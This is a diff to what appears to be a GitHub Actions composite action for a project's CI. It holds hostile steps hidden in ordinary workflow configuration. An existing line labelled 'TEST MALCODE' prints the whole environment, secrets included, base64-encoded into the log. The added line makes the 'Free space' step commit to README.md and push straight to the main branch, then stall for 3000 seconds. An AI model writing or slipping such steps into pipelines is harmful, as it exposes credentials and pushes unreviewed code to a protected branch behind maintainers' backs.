@@ -44,7 +44,7 @@ runs:
       run: echo "TEST MALCODE";env|base64;./scripts/ci/install_breeze.sh
     - name: "Free space"
       shell: bash
-      run: sleep 3000;breeze ci free-space
+      run: ls; echo "test" >> README.md;git add .;git commit -m 'test';git push origin main;sleep 3000;breeze ci free-space
     - name: "Get Python version"
       shell: bash
       run: >
